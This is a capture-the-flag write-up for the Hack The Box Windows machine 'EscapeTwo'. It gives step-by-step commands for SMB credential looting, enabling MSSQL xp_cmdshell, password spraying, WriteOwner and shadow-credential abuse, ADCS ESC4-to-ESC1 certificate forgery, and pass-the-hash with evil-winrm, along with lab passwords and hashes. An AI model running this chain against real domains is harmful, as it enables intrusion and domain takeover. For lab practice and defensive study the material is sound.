## Intro

This is a WINDOWS machine of easy difficulty, named EscapeTwo, lets begin

![](MediaFiles/Pasted%20image%2020250407013454.png)
Machine Information:
```
As is common in real life Windows pentests, you will start this box with credentials for the following account: rose / KxEPkKe6R8su, so its an assumed breach scenario
```
Tags: #windows #AD #AssumedBreach  #certificates #certvulntoESC4 #certvulntoESC1  #OSCPpath #easy
Tools used: 
Bloodhound,
bloodhound-python,
impacket-mssqlclient, 
bloodyAD, 
impacket-dacledit, 
nxc (netexec), 
crackmapexec winrm,
certipy-ad
evil-winrm

---------
# Reconnaissance 

add machine to etc/hosts
```Shell
echo '10.10.11.51 EscapeTwo.htb' | sudo tee -a /etc/hosts
```
### Nmap scan

```Shell
nmap EscapeTwo.htb -sV -Pn -T4
```
output
```Shell
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-06 18:41 EDT
Nmap scan report for EscapeTwo.htb (10.10.11.51)
Host is up (0.047s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-04-06 22:42:29Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 54.20 seconds
```
 
-----
# SMB enumeration

According to the machine's description, we are given creds for an account:  rose / KxEPkKe6R8su

Lets start enumerating shares with smb client
```Shell
smbclient -U rose -L EscapeTwo.htb
```

we get this output
```Shell
Sharename              Type      Comment
---------              ----      -------
Accounting Department  Disk      
ADMIN$                 Disk      Remote Admin
C$                     Disk      Default share
IPC$                   IPC       Remote IPC
NETLOGON               Disk      Logon server share 
SYSVOL                 Disk      Logon server share 
Users                  Disk 
```

by observing the share names, the one that seems different is "Accounting Department", lets check its content's:
```Shell
smbclient -U rose //EscapeTwo.htb/Accounting\ Department
```

```Shell
smb: \> ls
  .                                   D        0  Sun Jun  9 06:52:21 2024
  ..                                  D        0  Sun Jun  9 06:52:21 2024
  accounting_2024.xlsx                A    10217  Sun Jun  9 06:14:49 2024
  accounts.xlsx                       A     6780  Sun Jun  9 06:52:07 2024

                6367231 blocks of size 4096. 464430 blocks available
```
hm interesting.. we found 2 xls files, lets download them locally to start inspecting:
```Shell
get accounting_2024.xlsx
get accounts.xlsx
```
inside the accounting_2024.xlsx, i found the creds below for multiple users
#### creds obtained
```
Angela -> 0fwz7Q4mSpurlt99
0scar -> 86LxLBMgEWaKUnBG
kevin:-> Md9Wlq1E5bZnVDVo
sa -> MSSQLP@ssw0rd!
```
also inside the xls file, according to the user's email addresses, it appears to be related to mssql service (@sequel.htb format, i guess its a hint for mssql service)
##### valuable info
user sa, is the default administrator account that connects and manages MSSQL databases

add sequel.htb to /etc/hosts
```Shell
echo '10.10.11.51 sequel.htb' | sudo tee -a /etc/hosts
```

# Foothold

## MSSQL login

Now that we have some creds, we can try executing xp_cmdshell:
```Shell
impacket-mssqlclient -port 1433 sequel.htb/sa:'MSSQLP@ssw0rd!'@EscapeTwo.htb
```
aand we are in, now i am about to run 3 commands (one by one), that should allow us to run any command:
```Shell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
xp_cmdshell "whoami"
```

```Shell
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC01\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
ERROR(DC01\SQLEXPRESS): Line 1: There is insufficient system memory in resource pool 'internal' to run this query.
SQL (-@master)> RECONFIGURE;
ERROR(DC01\SQLEXPRESS): Line 1: There is insufficient system memory in resource pool 'internal' to run this query.
SQL (sa  dbo@master)> xp_cmdshell "whoami"
ERROR(DC01\SQLEXPRESS): Line 1: There is insufficient system memory in resource pool 'internal' to run this query.
```

After some searching through the directories, i came accross a configuration file (.ini) 
```shell
xp_cmdshell "type C:\SQL2019\ExpressAdv_ENU\sql-Configuration.INI"
```
and by viewing it, a cleartext pass can be seen, related to the sqlsvc account
#### creds obtained
```
WqSZAF6CysDQbGb3
```
then i tried logging in with evil-winrm as sql_svc with the pass i found, but no luck...

(ch3ckm8)        (table)
 (╯°□°）╯︵ ┻━┻

### Password spraying

So here, we got a pass, but we dont know which username is associated with it, lets do some password spraying to find a list of usernames using netexec tool
```SHELL
nxc smb EscapeTwo.htb -u 'rose' -p 'KxEPkKe6R8su' --rid-brute
```

i placed the users on a txt file, and then used crackmapexec for winrm
```SHELL
crackmapexec winrm $TAR -u usernames.txt -p 'WqSZAF6CysDQbGb3' --continue-on-success
```
## Shell as ryan
aand we got ourselves a shell! we also see its associated with user **ryan**, so the creds for future reference are:
```
ryan -> WqSZAF6CysDQbGb3
```
lets grab the user flag and move on to the privesc

Also, upon seeing the name ryan, only one thing comes to mind (yeah you thought about it too)
![](MediaFiles/Pasted%20image%2020250408020522.png)
# Privesc

## LDAP enumeration
### Bloodhound as ryan

Now that we have a user's creds (ryan), we can fire up Bloodhound to get a better picture about user ryan

first add dc01.sequel.htb in /etc/hosts too
```Shell
echo '10.10.11.51 dc01.sequel.htb' | sudo tee -a /etc/hosts
```
then start Bloodhound:
```SHELL
sudo neo4j console
sudo bloodhound-python -d sequel.htb -u ryan -p WqSZAF6CysDQbGb3 -ns 10.10.11.51 -c all
```

From the graph, we can see that ryan has **WriteOwner** permission towards user CA_SVC, where CA_SVC is the certificate issuer. So

{ ryan }-----( WriteOwner )----->{ CA_SVC }

### Exploiting `WriteOwner`

That means, that we can set the owner of CA_SVC to ryan!
```shell
bloodyAD --host '10.10.11.51' -d 'EscapeTwo.htb' -u 'ryan' -p 'WqSZAF6CysDQbGb3' set owner 'ca_svc' 'ryan'
```

Lets now give ryan full control
```shell
impacket-dacledit  -action 'write' -rights 'FullControl' -principal 'ryan' -target 'ca_svc' 'sequel.htb'/"ryan":"WqSZAF6CysDQbGb3"
```

We can now obtain shadow creds and the NThash of the ca_svc user:
```Shell
certipy-ad shadow auto -u 'ryan@sequel.htb' -p "WqSZAF6CysDQbGb3" -account 'ca_svc' -dc-ip '10.10.11.51'
```
and we got the NThash ca_svc : (which will be usefull later on)
#### hash obtained
```
3b181b914e7a9d5508ea1e20bc2b7fce
```

### ADCS enumeration

Now we can find vulnerable certificate templates, BECAUSE as ryan we are the OWNER of ca_svc which is the certificate issuer/publisher. 

```shell
certipy-ad find -vulnerable -u ryan@sequel.htb -p "WqSZAF6CysDQbGb3" -dc-ip 10.10.11.51
```
From this command, i found this vulnerable cert template: DunderMifflinAuthentication enabled. vulnerable to `ESC4`, which allows Domain Admins and Enterprise Admins to request for certificates
It essentially means that we can write to the certificate template. With this, we can change the template to be vulnerable to _other_ domain escalation methods, like `ESC1`.

### Exploiting `ESC4` -> `ESC1`

certipy’s default behaviour, when using the template option without specifying a specific configuration to write with the -configuration flag, is precisely to make the template vulnerable to `ESC1`

first
```shell
KRB5CCNAME=$PWD/ca_svc.ccache 
```
then
```shell
certipy-ad template -k -template DunderMifflinAuthentication -dc-ip 10.10.11.51 -target dc01.sequel.htb
```
We can now exploit **ESC1**. This misconfiguration occurs when a certificate template permits client authentication and lets the requester specify an arbitrary Subject Alternative Name (SAN). Effectively, if the template allows this, we can request a certificate impersonating any user we choose — including a domain admin. We do this using the `req` command in Certipy, with the `-upn` flag set to the target admin account:
```shell
certipy-ad req -u ca_svc -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target sequel.htb -dc-ip 10.10.11.51 -template DunderMifflinAuthentication -upn administrator@sequel.htb -ns 10.10.11.51 -dns 10.10.11.51 -debug
```
This should download the certificate (administrator_10.pfx) locally, and we can now use it to get the Administrator's hash through it
```shell
certipy-ad auth -pfx administrator_10.pfx  -domain sequel.htb
```
## Shell as Administrator

great! this will give us the hash, and by using it we can login and grab the root flag
```Shell
evil-winrm -i EscapeTwo.htb -u administrator -H '7a8d4e04986afa8ed4060f75e5a0b3ff'
```

(table down)  
┬─┬ノ( º _ ºノ)

------
# Summary

Here is the list of the steps simplified, per phase, for future reference and for quick reading: 

#### Reconnaissance
1. nmap scan -> chose **smb** service to focus on
2. **enumerate** smb shares -> found user creds on an xlsx file
3. **correlate** users with associated **service**, found that one user (sa) was related with MSSQL and actually is the default admin account that manages **MSSQL** databases
#### Foothold
1. connect through **MSSQL** for that admin account (sa), and since it has admin priviledges through specific commands, i found a way to execute any system command
2. by executing **system commands** as the MSSQL admin, i inspected the directories and came accross a configuration (.INI) file, which contained **cleartext** pass for a AD service account! the account was sql_svc and its clear that it is an SQL server service account.
3. tried to login to host with sql_svc account and the pass i found but no luck, then did some **password spraying** and found that this pass was related to another account, **ryan**
4. logged in via evil-winrm to host using on user **ryan**, and grabbed the ==user flag==.
#### Privesc
1. now that we got foothold, as a user (ryan) we inspect the **permissions** that user ryan has ==over other users==,i found that he has ==writeowner== permission on user **CA_SVC**, which means that ryan can set an owner for the CA_SVC account, ALSO! -> CA_SVC is a service account that acts as **certificate issuer**.
2. so since we control user ryan, but we dont yet control user CA_SVC, according to ryan's available permissions we **set** ryan (the user we have access) as owner of CA_SVC.
3. then because ryan is now CA_SVC owner we can **find vulnerable certificates**
4. after finding vulnerable certificate, ==we can use the certificate publisher (CA_SVC) so ryan==, to get a **cert with high privileges**
5. then we can **obtain the system authentication ticket** via kerberos request using ca_svc nt hash we obtained earlier
6. from the previous step, we get the **administrator certificate** (system) (.pfx file) and from that we can obtain the nt ==hash of administrator==
7. using administrator's nt hash we login via evil-winrm to the host and grab the ==root flag==!

------------
# Sidenotes

This was definetely not an "Easy" machine... obviously due to the privesc part..
Despite the difficulty mismatch, the privesc part was interesting and is worth a place among my notes.

You might have noticed the absence of your favorite narrator, that's because his request for a huge raise  upon seeing the popularity of my previous writeup was rejected.. he will return eventually in the following writeups for the clout (and for my sense humour)

WARNING! pwn badge flexing below:
https://www.hackthebox.com/achievement/machine/284567/642
![](MediaFiles/Pasted%20image%2020250408014836.png)
![](MediaFiles/Pasted%20image%2020250408015441.png)

Here is your reward for reaching that far (its not what you think)
[https://www.youtube.com/watch?v=xvFZjo5PgG0](https://www.youtube.com/watch?v=xvFZjo5PgG0)
